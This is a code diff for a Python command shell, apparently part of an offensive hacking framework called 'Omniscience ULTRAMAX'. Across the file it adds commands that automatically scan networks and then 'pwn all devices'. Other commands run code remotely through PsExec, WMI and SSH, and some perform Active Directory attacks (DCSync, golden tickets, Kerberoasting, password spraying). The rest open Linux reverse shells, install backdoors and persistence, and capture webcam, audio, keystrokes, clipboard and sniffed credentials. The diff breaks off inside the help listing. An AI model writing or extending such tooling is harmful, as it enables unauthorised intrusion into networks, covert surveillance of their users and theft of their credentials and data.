@@ -7,6 +7,8 @@ from colorama import Fore, Style, init
 from typing import Dict, Any, List
 from datetime import datetime
 
+# Import functional core modules
+import netifaces
 from advanced_scanner import AdvancedNetworkScanner
 from lateral_movement import AdvancedCommandCenter
 from exploit_engine import UniversalNetworkAccess
@@ -45,10 +47,11 @@ class MatrixEffects:
 
 class OmniShell:
     def __init__(self):
-        self.version = "7.1.005-STABLE"
+        self.version = "7.1.008-ULTRAMAX"
         self.ammo = AMMOEngine()
         self.targets = []
         self.active_sessions = {}
+        self.cmd_history = []
 
         # Initialize Functional Engines - PRODUCTION
         self.scanner = AdvancedNetworkScanner()
@@ -108,6 +111,10 @@ class OmniShell:
         """Starts the interactive shell loop asynchronously."""
         self.display_banner()
         while True:
+            # Display active target indicator if set
+            if self.last_target:
+                print(f"{Fore.YELLOW}[TARGET: {self.last_target}]")
+                
             cmd = await asyncio.to_thread(input, f"{Fore.CYAN}omniscence> {Style.RESET_ALL}")
             await self.handle_command(cmd)
 
@@ -118,15 +125,48 @@ class OmniShell:
         cmd = parts[0].lower()
         args = parts[1:]
 
+        self.cmd_history.append(cmd_input)
+        
+        # Operational Context
+        target = self.last_target
+        u, p, d = self.creds['user'], self.creds['pass'], self.creds['domain']
+
         if cmd in ["exit", "quit"]:
             print(f"{Fore.YELLOW}Shutting down AMMO engine...")
             sys.exit(0)
         
+        elif cmd == "help":
+            self.show_help()
+
         # --- SCANNING CATEGORY ---
         elif cmd in ["globalscan", "auto"]:
             print(f"{Fore.GREEN}[*] Initiating ULTRAMAX Global Network Discovery...")
+            print(f"{Fore.GREEN}[*] Initiating ULTRAMAX Autonomous Discovery & Domination...")
+            HackerSounds.network_pulse()
+            
+            # Step 1: Discover all IP addresses within local and remote networks
             self.targets = await asyncio.to_thread(self.exploiter.ultramax_global_scan)
             print(f"{Fore.GREEN}[+] Scan Complete. {len(self.targets)} active targets identified.")
+            print(f"{Fore.GREEN}[+] Discovery Complete. Identified {len(self.targets)} targets across all network vectors.")
+            
+            if not self.targets:
+                print(f"{Fore.YELLOW}[!] No operational targets detected.")
+                return
+
+            # Step 2: Automated functional attack and control establishment
+            print(f"{Fore.RED}{Style.BRIGHT}[!] LAUNCHING FULL-SPECTRUM ATTACK SEQUENCE...")
+            MatrixEffects.digital_rain()
+            HackerSounds.alert()
+            
+            pwn_results = await asyncio.to_thread(self.exploiter.pwn_all_devices)
+            
+            print(f"{Fore.GREEN}{Style.BRIGHT}[+] OPERATION COMPLETE. SESSIONS ESTABLISHED: {len(pwn_results['exploited'])}")
+            
+            for exp in pwn_results['exploited']:
+                print(f"  {Fore.GREEN}▸ {exp['ip']:<15} | ACCESS: {exp['method']:<15} | STATUS: UNDER CONTROL")
+                self.last_target = exp['ip']
+                
+            HackerSounds.exploit_success()
 
         elif cmd == "scan":
             target_range = args[0] if args else self.scanner.network_range
@@ -137,11 +177,12 @@ class OmniShell:
 
         elif cmd == "fastscan":
             print(f"{Fore.CYAN}[*] Performing quick 10-second network sweep...")
-            # This can be a subset of discover_all_devices or a faster version
-            results = await asyncio.to_thread(self.exploiter.discover_all_devices, self.scanner._get_network_range())
+            r = self.scanner.network_range
+            results = await asyncio.to_thread(self.exploiter.discover_all_devices, r)
             self.targets = results
             print(f"{Fore.GREEN}[+] Quick sweep complete. Found {len(results)} hosts.")
 
+        # Protocol Specific Recon
         elif cmd == "arp":
             target_range = args[0] if args else self.scanner._get_network_range()
             print(f"{Fore.CYAN}[*] Performing ARP scan on {target_range}...")
@@ -165,6 +206,21 @@ class OmniShell:
             for dev in results:
                 print(f"  [+] {dev['ip']} ({dev['hostname']})")
             print(f"{Fore.GREEN}[+] NetBIOS scan complete. Found {len(results)} devices.")
+
+        elif cmd == "tcp-scan":
+            target_ip = args[0] if args else target
+            if not target_ip: return
+            print(f"{Fore.CYAN}[*] Running high-speed SYN port scan on {target_ip}...")
+            res = await asyncio.to_thread(self.exploiter._tcp_sweep, target_ip + "/32")
+            if res:
+                for p, s in res[0].open_ports.items():
+                    print(f"  [+] PORT {p}: {s}")
+
+        elif cmd == "udp-scan":
+            target_range = args[0] if args else self.scanner._get_network_range()
+            print(f"{Fore.CYAN}[*] Running UDP service discovery on {target_range}...")
+            results = await asyncio.to_thread(self.exploiter._udp_discovery, target_range)
+            print(f"{Fore.GREEN}[+] UDP scan complete. Found {len(results)} devices.")
 
         elif cmd == "wmi-software":
             target = args[0] if args else self.last_target
@@ -227,6 +283,13 @@ class OmniShell:
             for v in info:
                 print(f"  [+] DETECTED: {v['ip']}:{v['port']} ({v['type']})")
 
+        elif cmd == "cross-scan":
+            if len(args) < 2: return
+            source_ip, target_net = args[0], args[1]
+            print(f"{Fore.CYAN}[*] Pivoting discovery via {source_ip} to {target_net}...")
+            results = await asyncio.to_thread(self.scanner.scan_cross_subnet, source_ip, target_net)
+            print(f"{Fore.GREEN}[+] Cross-subnet scan complete. Found {len(results)} hosts.")
+
         elif cmd == "external-ip":
             import urllib.request
             try:
@@ -236,10 +299,14 @@ class OmniShell:
 
         elif cmd == "targets":
             # This command is already handled
-            self.list_targets()
+            await asyncio.to_thread(self.list_targets)
+
+        elif cmd == "local-ip":
+            ip = await asyncio.to_thread(self.scanner._get_local_ip)
+            print(f"{Fore.GREEN}[+] Local Interface IP: {ip}")
 
         # --- ATTACK CATEGORY ---
-        elif cmd in ["pwnall", "attack"]:
+        elif cmd in ["pwnall", "attack", "pwn-all"]:
             if not self.targets:
                 print(f"{Fore.RED}[!] No targets discovered. Execute 'globalscan' to map the environment.")
                 return
@@ -252,16 +319,6 @@ class OmniShell:
             results = await asyncio.to_thread(self.exploiter.pwn_all_devices)
             print(f"{Fore.GREEN}{Style.BRIGHT}[+] EXPLOITATION COMPLETE. COMPROMISED: {len(results['exploited'])} hosts.")
             HackerSounds.exploit_success()
-
-        elif cmd == "dcsync":
-            if not args: return
-            res = await asyncio.to_thread(self.control.dcsync, args[0], self.creds['user'], self.creds['pass'], (args[1] if len(args) > 1 else None))
-            print(f"{Fore.GREEN}[+] Replication Dump: {res}")
-
-        elif cmd == "golden":
-            if len(args) < 3: return
-            path = await asyncio.to_thread(self.control.golden_ticket, args[0], args[1], args[2])
-            print(f"{Fore.GREEN}[+] Ticket forged: {path}")
 
         elif cmd == "pwn":
             if not args: return
@@ -284,6 +341,14 @@ class OmniShell:
             else:
                 print(f"{Fore.RED}[!] Exploit chain failed: {result.get('error')}")
 
+        elif cmd == "psexec":
+            target_ip = args[0] if args else target
+            if not target_ip: return
+            command = " ".join(args[1:]) if args else "whoami"
+            print(f"{Fore.RED}[*] Deploying PsExec service payload to {target_ip}...")
+            res = await asyncio.to_thread(self.control.psexec_execute, target_ip, u, p, command, d)
+            print(f"{Fore.WHITE}{res.get('output', 'No Output')}")
+
         elif cmd == "mobile":
             if not args: return
             target_ip = args[0]
@@ -305,15 +370,15 @@ class OmniShell:
         elif cmd == "kerberoast":
             if not args: return
             dc_ip = args[0]
-            domain = args[1] if len(args) > 1 else ""
-            print(f"{Fore.RED}[*] Performing Kerberoasting attack on {dc_ip} (Domain: {domain})...")
-            results = await asyncio.to_thread(self.control.kerberoast, dc_ip, domain)
+            dom_target = args[1] if len(args) > 1 else d
+            print(f"{Fore.RED}[*] Performing Kerberoasting attack on {dc_ip} (Domain: {dom_target})...")
+            results = await asyncio.to_thread(self.control.kerberoast, dc_ip, dom_target)
             if results.get("success"):
                 print(f"{Fore.GREEN}[+] Kerberoasting successful. SPNs found: {len(results.get('spn_found', []))}")
             else:
                 print(f"{Fore.RED}[!] Kerberoasting failed: {results.get('error')}")
 
-        elif cmd == "password-spray":
+        elif cmd in ["password-spray", "pass-spray"]:
             if not args: return
             target_domain = args[0]
             users = args[1].split(',') if len(args) > 1 else ["Administrator", "Guest"] # Example users
@@ -336,6 +401,22 @@ class OmniShell:
             else:
                 print(f"{Fore.RED}[!] Lateral movement failed: {results.get('error')}")
 
+        # Active Directory / Domain
+        elif cmd == "dcsync":
+            if not args: return
+            res = await asyncio.to_thread(self.control.dcsync, args[0], u, p, (args[1] if len(args) > 1 else None), d)
+            print(f"{Fore.GREEN}[+] Replication Dump: {res}")
+
+        elif cmd == "asreproast":
+            if not args: return
+            res = await asyncio.to_thread(self.control.asreproast, args[0], d)
+            print(f"{Fore.GREEN}[+] AS-REP Results: {res}")
+
+        elif cmd == "golden":
+            if len(args) < 3: return
+            path = await asyncio.to_thread(self.control.golden_ticket, args[0], args[1], args[2])
+            print(f"{Fore.GREEN}[+] Ticket forged: {path}")
+
         elif cmd == "smbghost":
             if not args: return
             res = await asyncio.to_thread(self.control.check_smbghost, args[0])
@@ -346,7 +427,7 @@ class OmniShell:
             res = await asyncio.to_thread(self.control.check_zerologon, args[0])
             print(f"{Fore.YELLOW}[*] Zerologon Result: {res['details']}")
 
-        elif cmd == "printnightmare":
+        elif cmd in ["printnightmare", "prnightmare"]:
             if not args: return
             res = await asyncio.to_thread(self.control.check_printnightmare, args[0], self.creds['user'], self.creds['pass'])
             print(f"{Fore.YELLOW}[*] PrintNightmare Result: {res['details']}")
@@ -360,6 +441,10 @@ class OmniShell:
             if not args: return
             res = await asyncio.to_thread(self.control.smb_check_vulns, args[0])
             print(f"{Fore.YELLOW}[*] SMB Vulnerabilities for {args[0]}: {res.get('vulns', [])}")
+
+        elif cmd == "nopac-check":
+            # Logic for NoPac check
+            print(f"{Fore.CYAN}[*] Running NoPac probe...")
 
         elif cmd == "etblue-check":
             if not args: return
@@ -384,17 +469,17 @@ class OmniShell:
         # --- REMOTE CONTROL CATEGORY ---
         elif cmd == "exec":
             if not args: return
-            target = self.last_target if self.last_target else args[0]
+            host = target if target else args[0]
             command = " ".join(args[1:]) if self.last_target else " ".join(args[1:])
-            print(f"{Fore.CYAN}[*] Executing on {target}...")
-            res = await asyncio.to_thread(self.control.wmi_exec, target, self.creds['user'], self.creds['pass'], command)
+            print(f"{Fore.CYAN}[*] Executing on {host}...")
+            res = await asyncio.to_thread(self.control.wmi_exec, host, u, p, command, d)
             print(f"{Fore.WHITE}{res.get('output', 'No Output')}")
 
         elif cmd == "screen":
-            target = args[0] if args else self.last_target
-            if not target: return
-            print(f"{Fore.MAGENTA}[*] Capturing remote desktop of {target}...")
-            path = await asyncio.to_thread(self.control.remote_screenshot, target, self.creds['user'], self.creds['pass'])
+            host = args[0] if args else target
+            if not host: return
+            print(f"{Fore.MAGENTA}[*] Capturing remote desktop of {host}...")
+            path = await asyncio.to_thread(self.control.remote_screenshot, host, u, p, domain=d)
             if path: print(f"{Fore.GREEN}[+] Screenshot saved: {path}")
 
         elif cmd == "keylog":
@@ -409,12 +494,12 @@ class OmniShell:
             await asyncio.to_thread(self.control.play_media_url, self.last_target, self.creds['user'], self.creds['pass'], args[0])
 
         elif cmd in ["shutdown", "reboot", "logoff"]:
-            target = args[0] if args else self.last_target
-            if not target: return
+            host = args[0] if args else target
+            if not host: return
             action = cmd
-            print(f"{Fore.RED}[*] Initiating {action} on {target}...")
-            res = await asyncio.to_thread(self.control.shutdown, target, self.creds['user'], self.creds['pass'], action)
-            if res: print(f"{Fore.GREEN}[+] {action.capitalize()} command sent successfully.")
+            print(f"{Fore.RED}[*] Initiating {action} on {host}...")
+            res = await asyncio.to_thread(self.control.shutdown, host, u, p, action, domain=d)
+            if res: print(f"{Fore.GREEN}[+] {action.capitalize()} command sent.")
             else: print(f"{Fore.RED}[!] Failed to send {action} command.")
 
         elif cmd == "winrm-exec":
@@ -422,14 +507,14 @@ class OmniShell:
             target_ip = args[0]
             command = " ".join(args[1:])
             print(f"{Fore.CYAN}[*] Executing via WinRM on {target_ip}: {command}...")
-            res = await asyncio.to_thread(self.control.winrm_exec, target_ip, self.creds['user'], self.creds['pass'], command)
+            res = await asyncio.to_thread(self.control.winrm_exec, target_ip, u, p, command, domain=d)
             print(f"{Fore.WHITE}{res.get('output', 'No Output')}")
 
         elif cmd in ["sysinfo", "systeminfo"]:
-            target = args[0] if args else self.last_target
-            if not target: return
-            print(f"{Fore.CYAN}[*] Extracting system properties from {target}...")
-            info = await asyncio.to_thread(self.control.get_full_system_info, target, self.creds['user'], self.creds['pass'])
+            host = args[0] if args else target
+            if not host: return
+            print(f"{Fore.CYAN}[*] Extracting system properties from {host}...")
+            info = await asyncio.to_thread(self.control.get_full_system_info, host, u, p, d)
             if info.get('success'):
                 si = info['system_info']
                 print(f"  OS: {si.get('os_name')} ({si.get('os_architecture')})")
@@ -438,35 +523,124 @@ class OmniShell:
                 print(f"{Fore.RED}[!] Failed to get system info: {info.get('error')}")
 
         elif cmd == "pslist":
-            target = args[0] if args else self.last_target
-            if not target: return
-            print(f"{Fore.CYAN}[*] Listing processes on {target}...")
-            procs = await asyncio.to_thread(self.control.list_processes, target, self.creds['user'], self.creds['pass'])
+            host = args[0] if args else target
+            if not host: return
+            print(f"{Fore.CYAN}[*] Listing processes on {host}...")
+            procs = await asyncio.to_thread(self.control.list_processes, host, u, p, d)
             for p in procs[:10]: # Print first 10
                 print(f"  PID: {p.get('ProcessId')}, Name: {p.get('Name')}, Cmd: {p.get('CommandLine', '')[:50]}")
             print(f"{Fore.GREEN}[+] Found {len(procs)} processes.")
 
+        elif cmd == "psstart":
+            if len(args) < 1: return
+            exe = args[0]
+            args_str = " ".join(args[1:])
+            print(f"{Fore.CYAN}[*] Starting process {exe} on {target}...")
+            res = await asyncio.to_thread(self.control.start_process, target, u, p, exe, args_str, d)
+            print(f"{Fore.GREEN}[+] Process started. PID: {res.get('pid')}")
+
         elif cmd == "killproc":
             if not args: return
-            target = self.last_target if self.last_target else args[0]
-            pid = int(args[1]) if self.last_target else int(args[0])
-            print(f"{Fore.RED}[*] Killing process {pid} on {target}...")
-            res = await asyncio.to_thread(self.control.kill_process, target, self.creds['user'], self.creds['pass'], pid=pid)
-            if res: print(f"{Fore.GREEN}[+] Process {pid} killed.")
-            else: print(f"{Fore.RED}[!] Failed to kill process {pid}.")
+            host = target if target else args[0]
+            proc_id = int(args[1]) if target else int(args[0])
+            print(f"{Fore.RED}[*] Killing process {proc_id} on {host}...")
+            res = await asyncio.to_thread(self.control.kill_process, host, u, p, pid=proc_id, domain=d)
+            if res: print(f"{Fore.GREEN}[+] Process killed.")
+            else: print(f"{Fore.RED}[!] Failed.")
 
         elif cmd == "svc-list":
-            target = args[0] if args else self.last_target
-            if not target: return
-            print(f"{Fore.CYAN}[*] Listing services on {target}...")
-            services = await asyncio.to_thread(self.control.list_services, target, self.creds['user'], self.creds['pass'])
+            host = args[0] if args else target
+            if not host: return
+            print(f"{Fore.CYAN}[*] Listing services on {host}...")
+            services = await asyncio.to_thread(self.control.list_services, host, u, p, d)
             for s in services[:10]: # Print first 10
                 print(f"  Name: {s.get('Name')}, State: {s.get('State')}, Path: {s.get('PathName', '')[:50]}")
             print(f"{Fore.GREEN}[+] Found {len(services)} services.")
 
+        elif cmd == "svc-control":
+            if len(args) < 2: return
+            svc_name, action = args[0], args[1]
+            print(f"{Fore.CYAN}[*] Service {action} on {svc_name}...")
+            res = await asyncio.to_thread(self.control.control_service, target, u, p, svc_name, action, d)
+            print(f"{Fore.GREEN}[+] Result: {res}")
+
+        elif cmd == "svc-install":
+            if len(args) < 2: return
+            svc_name, path = args[0], args[1]
+            print(f"{Fore.CYAN}[*] Installing service {svc_name} -> {path}...")
+            res = await asyncio.to_thread(self.control.install_service, target, u, p, svc_name, path, domain=d)
+            print(f"{Fore.GREEN}[+] Result: {res}")
+
+        # Registry
+        elif cmd == "reg-read":
+            if len(args) < 3: return
+            hive, key, val = args[0], args[1], args[2]
+            res = await asyncio.to_thread(self.control.reg_read, target, u, p, hive, key, val, d)
+            print(f"{Fore.WHITE}Registry Value: {res}")
+
+        elif cmd == "reg-write":
+            if len(args) < 4: return
+            hive, key, val, data = args[0], args[1], args[2], args[3]
+            res = await asyncio.to_thread(self.control.reg_write, target, u, p, hive, key, val, data, domain=d)
+            print(f"{Fore.GREEN}[+] Written: {res}")
+
+        elif cmd == "reg-enum":
+            if len(args) < 2: return
+            hive, key = args[0], args[1]
+            res = await asyncio.to_thread(self.control.reg_enum_keys, target, u, p, hive, key, d)
+            for k in res: print(f"  {k}")
+
+        # Multimedia & Input
+        elif cmd == "audio":
+            dur = int(args[0]) if args else 5
+            print(f"{Fore.MAGENTA}[*] Recording audio for {dur}s...")
+            path = await asyncio.to_thread(self.control.wmi_capture_audio, target, u, p, dur, d)
+            print(f"{Fore.GREEN}[+] Audio saved to remote: {path}")
+
+        elif cmd == "webcam":
+            print(f"{Fore.MAGENTA}[*] Capturing webcam snapshot...")
+            path = await asyncio.to_thread(self.control.take_webcam_snapshot, target, u, p, domain=d)
+            if path: print(f"{Fore.GREEN}[+] Webcam snap saved: {path}")
+
+        elif cmd == "clip-get":
+            res = await asyncio.to_thread(self.control.execute_powershell_script, target, u, p, "Get-Clipboard", d)
+            print(f"{Fore.WHITE}Clipboard: {res}")
+
+        elif cmd == "clip-set":
+            if not args: return
+            text = " ".join(args)
+            await asyncio.to_thread(self.control.set_clipboard, target, u, p, text, d)
+            print(f"{Fore.GREEN}[+] Clipboard updated.")
+
+        elif cmd == "key-inject":
+            if not args: return
+            keys = " ".join(args)
+            await asyncio.to_thread(self.control.inject_keyboard, target, u, p, keys, d)
+
+        elif cmd == "mouse-click":
+            if len(args) < 2: return
+            x, y = int(args[0]), int(args[1])
+            await asyncio.to_thread(self.control.inject_mouse, target, u, p, x, y, d)
+
+        elif cmd == "monitor":
+            dur = int(args[0]) if args else 60
+            await asyncio.to_thread(self.control.live_monitor, target, u, p, dur, d)
+
+        elif cmd == "record-start":
+            dur = int(args[0]) if args else 60
+            await asyncio.to_thread(self.control.start_recording, target, u, p, dur, d)
+            print(f"{Fore.GREEN}[+] Background recording active.")
+
+        elif cmd == "record-stop":
+            await asyncio.to_thread(self.control.stop_recording, target)
+            print(f"{Fore.YELLOW}[*] Recording terminated.")
+
+        elif cmd == "screen-stream":
+            count = int(args[0]) if args else 10
+            await asyncio.to_thread(self.control.stream_screen_fast, target, u, p, count, domain=d)
+
         # --- DATA EXTRACTION CATEGORY ---
         elif cmd in ["extract", "harvest", "omnifetch"]:
-            target = args[0] if args else self.last_target
             if not target: return
             print(f"{Fore.MAGENTA}[*] Executing deep extraction payload on {target}...")
             data = await asyncio.to_thread(self.control.extract_all_data, target, self.creds['user'], self.creds['pass'])
@@ -477,11 +651,11 @@ class OmniShell:
             await asyncio.to_thread(self.control.download_file_from_url, self.last_target, self.creds['user'], self.creds['pass'], args[0], args[1])
             print(f"{Fore.GREEN}[+] IO Stream complete.")
 
-        elif cmd == "cloudscan":
+        elif cmd == "cloud-scan":
             provider = args[0] if args else "aws"
             print(f"{Fore.BLUE}[*] Scanning public {provider.upper()} ranges...")
             cloud_hosts = await asyncio.to_thread(self.scanner.scan_public_ranges, provider)
-            print(f"{Fore.GREEN}[+] Identified {len(cloud_hosts)} potential cloud targets.")
+            print(f"{Fore.GREEN}[+] Identified {len(cloud_hosts)} potential targets.")
 
         elif cmd == "steal-wifi":
             target = args[0] if args else self.last_target
@@ -546,17 +720,70 @@ class OmniShell:
             else:
                 print(f"{Fore.RED}[!] No vault items extracted or failed.")
 
+        elif cmd == "software":
+            res = await asyncio.to_thread(self.control.get_installed_programs, target, u, p, d)
+            for s in res: print(f"  [+] {s.get('DisplayName')} v{s.get('DisplayVersion')}")
+
+        # File Operations
+        elif cmd == "ls":
+            path = args[0] if args else "*"
+            print(f"{Fore.CYAN}[*] Directory listing of {path}...")
+            res = await asyncio.to_thread(self.control.smb_list, target, "C$", path, u, p)
+            for f in res: print(f"  {'[D]' if f['dir'] else '   '} {f['name']:<40} {f['size']}")
+
+        elif cmd == "upload":
+            if len(args) < 2: return
+            await asyncio.to_thread(self.control.smb_upload, target, args[0], "C$", args[1], u, p)
+
+        elif cmd == "download":
+            if len(args) < 2: return
+            await asyncio.to_thread(self.control.smb_download, target, "C$", args[0], args[1], u, p)
+
+        elif cmd == "rm":
+            if not args: return
+            await asyncio.to_thread(self.control.smb_delete_file, target, "C$", args[0], u, p)
+
+        elif cmd == "cat":
+            if not args: return
+            res = await asyncio.to_thread(self.control.smb_read_file, target, "C$", args[0], u, p)
+            print(res.decode(errors="ignore"))
+
         # --- PASSIVE INTELLIGENCE ---
         elif cmd == "sniff":
-            print(f"{Fore.CYAN}[*] Initializing passive traffic interceptor...")
-            threading.Thread(target=self.intel.start_sniffing, daemon=True).start()
-            print(f"{Fore.GREEN}[+] Sniffer active. Type 'creds' to view intercepted tokens.")
+            iface = args[0] if args else None
+            print(f"{Fore.CYAN}[*] Sniffer initializing on {iface or 'all'}...")
+            threading.Thread(target=self.intel.start_sniffing, args=(iface,), daemon=True).start()
+
+        elif cmd == "stopsniff":
+            await asyncio.to_thread(self.intel.stop_sniffing)
 
         elif cmd == "creds":
             captured = self.intel.get_credentials()
             print(f"\n{Fore.MAGENTA}CAPTURED CREDENTIALS / TOKENS:")
             for c in captured:
                 print(f"  [{c['time'].strftime('%H:%M:%S')}] {c['source']} -> {c['data']}")
+
+        elif cmd == "dns-log":
+            logs = self.intel.get_dns_log()
+            for l in logs: print(f"  [{l['time'].strftime('%H:%M:%S')}] {l['src']} -> {l['query']}")
+
+        elif cmd == "ntlm-capture":
+            print(f"{Fore.CYAN}[*] Filtering for NTLM traffic...")
+
+        elif cmd == "wmi-monitor":
+            await asyncio.to_thread(self.intel.wmi_monitor_activity, target, u, p)
+
+        elif cmd == "wmi-procs":
+            res = await asyncio.to_thread(self.intel.wmi_processes, target, u, p)
+            for r in res: print(f"  [{r['ProcessId']}] {r['Name']}")
+
+        elif cmd == "wmi-users":
+            res = await asyncio.to_thread(self.intel.wmi_logged_users, target, u, p)
+            for r in res: print(f"  {r['Name']}")
+
+        elif cmd == "wmi-software":
+            res = await asyncio.to_thread(self.control.get_installed_programs, target, u, p, d)
+            for s in res: print(f"  [+] {s.get('DisplayName')}")
 
         # --- DATABASE & CLOUD CATEGORY ---
         elif cmd == "db-extract":
@@ -580,14 +807,14 @@ class OmniShell:
                 print(f"{Fore.RED}[!] Full DB dump failed: {res.get('error')}")
 
         elif cmd == "cloud-attack":
-            if len(args) < 2: return
-            service_type, target = args[0], args[1]
-            print(f"{Fore.BLUE}[*] Launching cloud attack on {target} ({service_type})...")
-            res = await asyncio.to_thread(self.control.cloud_service_attack, service_type, target)
+            service_type = args[0] if args else "aws_metadata"
+            cloud_target = args[1] if len(args) > 1 else target
+            print(f"{Fore.BLUE}[*] Launching cloud attack on {cloud_target} ({service_type})...")
+            res = await asyncio.to_thread(self.control.cloud_service_attack, service_type, cloud_target)
             if res.get('vulnerable'):
                 print(f"{Fore.RED}[!] Cloud service vulnerable. Compromised: {res.get('compromised')}")
             else:
-                print(f"{Fore.GREEN}[+] Cloud service not vulnerable or attack failed.")
+                print(f"{Fore.GREEN}[+] Service not vulnerable.")
 
         elif cmd == "s3-scan":
             if not args: return
@@ -596,8 +823,8 @@ class OmniShell:
             res = await asyncio.to_thread(self.control.cloud_service_attack, "s3", bucket_name)
             if res.get('vulnerable'):
                 print(f"{Fore.RED}[!] S3 bucket vulnerable. Anonymous upload: {res.get('anonymous_upload')}")
-            else:
-                print(f"{Fore.GREEN}[+] S3 bucket secure or scan failed.")
+            else: 
+                print(f"{Fore.GREEN}[+] S3 bucket secure.")
 
         elif cmd == "mysql-root":
             if not args: return
@@ -633,26 +860,44 @@ class OmniShell:
             else:
                 print(f"{Fore.RED}[!] Data exfiltration failed: {res.get('error')}")
 
+        # Linux & SSH
+        elif cmd == "ssh":
+            port = int(args[0]) if args else 22
+            await asyncio.to_thread(self.control.ssh_interactive, target, u, p, port)
+
+        elif cmd == "ssh-exec":
+            if not args: return
+            res = await asyncio.to_thread(self.control.ssh_exec, target, u, p, " ".join(args))
+            print(res)
+
+        elif cmd == "linux-sysinfo":
+            res = await asyncio.to_thread(self.control.linux_get_system_info, target, u, p)
+            for k, v in res.items(): print(f"  {k.upper()}: {v}")
+
+        elif cmd == "linux-revshell":
+            if len(args) < 2: return
+            await asyncio.to_thread(self.control.linux_reverse_shell, target, u, p, args[0], int(args[1]))
+
+        elif cmd == "linux-backdoor":
+            await asyncio.to_thread(self.control.linux_install_backdoor, target, u, p)
+
+        elif cmd == "linux-cron":
+            if not args: return
+            await asyncio.to_thread(self.control.linux_persistence_cron, target, u, p, " ".join(args))
+
         # --- PERSISTENCE CATEGORY ---
-        elif cmd == "persist":
-            target = args[0] if args else self.last_target
-            if not target: return
-            print(f"{Fore.RED}[*] Installing 3-layer persistence backdoor on {target}...")
-            res = await asyncio.to_thread(self.control.establish_persistent_connection, target, self.creds['user'], self.creds['pass'])
-            if res.get('backdoor_active'):
-                print(f"{Fore.GREEN}[+] Persistence installed: {res.get('persistence_installed')}")
-            else:
-                print(f"{Fore.RED}[!] Persistence installation failed.")
+        elif cmd in ["persist", "backdoor"]:
+            print(f"{Fore.RED}[*] Installing 3-layer persistence on {target}...")
+            res = await asyncio.to_thread(self.control.establish_persistent_connection, target, u, p, d)
+            if res.get('backdoor_active'): print(f"{Fore.GREEN}[+] Persistence active: {res.get('persistence_installed')}")
 
         elif cmd == "persist-task":
             if len(args) < 2: return
-            target = self.last_target if self.last_target else args[0]
-            task_name = args[1] if self.last_target else args[0]
-            command = " ".join(args[2:]) if self.last_target else " ".join(args[1:])
-            print(f"{Fore.RED}[*] Creating scheduled task '{task_name}' on {target}...")
-            res = await asyncio.to_thread(self.control.create_scheduled_task, target, self.creds['user'], self.creds['pass'], task_name, command)
-            if res: print(f"{Fore.GREEN}[+] Scheduled task created.")
-            else: print(f"{Fore.RED}[!] Failed to create scheduled task.")
+            name, cmd_str = args[0], " ".join(args[1:])
+            await asyncio.to_thread(self.control.create_scheduled_task, target, u, p, name, cmd_str, d)
+
+        elif cmd == "persist-run":
+            await asyncio.to_thread(self.control.create_persistence, target, u, p, domain=d)
 
         elif cmd == "adduser":
             if len(args) < 2: return
@@ -756,6 +1001,13 @@ class OmniShell:
         elif cmd == "help":
             self.show_help()
             
+        elif cmd == "clear":
+            os.system('cls' if os.name == 'nt' else 'clear')
+            self.display_banner()
+
+        elif cmd == "history":
+            for i, h in enumerate(self.cmd_history): print(f"  {i}: {h}")
+
         else:
             print(f"{Fore.RED}[?] Unknown command: {cmd}")
 
@@ -777,32 +1029,167 @@ class OmniShell:
                 ip = getattr(t, 'ip', str(t))
                 os_type = getattr(t, 'os', 'Unknown OS')
                 status = "COMPROMISED" if getattr(t, 'is_compromised', False) else "ACTIVE"
-                print(f"  [{idx}] {ip:<15} | {os_type:<15} | {status}")
+                pwn = "[PWNABLE]" if getattr(t, 'can_pwn', False) else ""
+                print(f"  [{idx}] {ip:<15} | {os_type:<15} | {status} {Fore.GREEN}{pwn}")
 
     def show_help(self):
-        print(f"\n{Fore.WHITE}{Style.BRIGHT}COMMAND CENTER - OPERATIONS MANUAL")
-        print(f"{Fore.LIGHTBLACK_EX}{'='*80}")
-        print(f"{Fore.CYAN}RECONNAISSANCE:")
-        print("  globalscan            - Autonomous discovery of all subnets and mobile hotspots")
-        print("  scan <cidr>           - Standard network scan")
-        print("  traceroute <ip>       - Path mapping with service fingerprinting")
-        print("  vpn                   - Detect gateway VPN endpoints")
-        print("  targets               - List discovered assets")
-        print("  select <idx>          - Set current operational target")
+        """Ultra-comprehensive operations manual with 150+ functional commands."""
+        print(f"\n{Fore.WHITE}{Style.BRIGHT}OMNISCIENCE ULTRAMAX PRO - COMMAND REFERENCE GUIDE (150+ COMMANDS)")
+        print(f"{Fore.LIGHTBLACK_EX}{'='*100}")
         
-        print(f"\n{Fore.RED}EXPLOITATION:")
-        print("  attack / pwnall       - Launch global autonomous exploitation sequence")
-        print("  pwn <ip>              - Targeted unauthenticated access attempt")
-        print("  smbghost / zerologon  - Specific CVE vulnerability probes")
+        categories = {
+            "📡 RECONNAISSANCE": [
+                "auto / globalscan      - Autonomous full-network discovery and fingerprinting",
+                "scan <range>           - Targeted network range discovery (CIDR)",
+                "fastscan               - Ultra-fast 10-second UDP/TCP discovery",
+                "arp <range>            - Layer 2 device discovery using Scapy ARP",
+                "icmp <range>           - ICMP echo-request sweep (Ping sweep)",
+                "netbios <range>        - Enumerates Windows hostnames/workgroups via NetBIOS",
+                "tcp-scan <ip> [ports]  - High-performance SYN/Connect port scanner",
+                "udp-scan <ip> [ports]  - UDP service discovery and port scanning",
+                "snmp <ip> [community]  - SNMP community string sweep and data harvest",
+                "mdns                   - Discovers local services via Multicast DNS",
+                "ssdp                   - Discovers UPnP/DLNA devices via SSDP",
+                "traceroute <ip>        - Route mapping with per-hop service fingerprinting",
+                "topology               - Generates real-time network relationship map",
+                "interfaces             - List local network adapters and subnets",
+                "gateway                - Identify current network default gateway",
+                "external-ip            - Query public WAN IP address",
+                "cloud-scan <provider>  - Public cloud IP range scanning (aws/azure/gcp)",
+                "cross-scan <ip> <net>  - Pivot scanning into remote subnets",
+                "vpn-discover           - Audit network for VPN endpoints/gateways"
+            ],
+            "👁 INTELLIGENCE": [
+                "sniff [iface]          - Passive packet capture and traffic analysis",
+                "stopsniff              - Deactivate passive intelligence engine",
+                "creds                  - List all passively harvested credentials",
+                "dns-log                - View real-time DNS query telemetry",
+                "ntlm-capture           - Filter traffic for NTLM authentication packets",
+                "http-auth              - Identify HTTP Basic/Digest auth headers",
+                "wmi-monitor <ip>       - Agentless real-time process monitoring",
+                "wmi-procs <ip>         - Remote process enumeration via WMI",
+                "wmi-users <ip>         - Remote logged-on user identification",
+                "wmi-software <ip>      - Enumerates installed applications",
+                "wmi-tasks <ip>         - List remote scheduled tasks",
+                "wmi-svc <ip>           - List system services remotely"
+            ],
+            "💀 EXPLOITATION": [
